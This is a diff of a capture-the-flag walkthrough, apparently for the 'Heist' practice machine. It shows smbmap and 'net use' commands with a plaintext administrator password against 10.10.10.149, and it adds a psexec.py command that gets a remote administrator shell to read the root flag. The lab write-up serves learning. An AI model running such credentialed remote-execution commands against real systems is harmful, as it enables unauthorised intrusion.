@@ -160,7 +160,7 @@ $  smbmap -uadministrator   -p '4dD!5}x/re8]FBuZ' -H 10.10.10.149
 	IPC$                                              	READ ONLY
 
 ```
-Ok creds work great, now i tried two ways to have my flag: 
+Ok creds work great, now i tried three ways to have my flag: 
 
 #### From output with smb 
 ```
@@ -178,6 +178,11 @@ $ net use r: \\SupportDesk\C$ /u:administrator "4dD!5}x/re8]FBuZ"
 $ r:
 ```
 ![flagrootlocally](https://github.com/roughiz/Heist-walktrough/blob/master/flagrootlocally.png)
+#### Fromoutput With psexec.ps
+```
+psexec.py SupportDesk/Administrator@10.10.10.149 -service-name LUALL.exe
+```
+ ![flagrootpsexec](https://github.com/roughiz/Heist-walktrough/blob/master/psexec.png)
 ### Nota : 
 - My winRm ruby script dosen't work for this box , i tried an other simple [script](https://alionder.net/winrm-shell/). (don't know why!!)
 
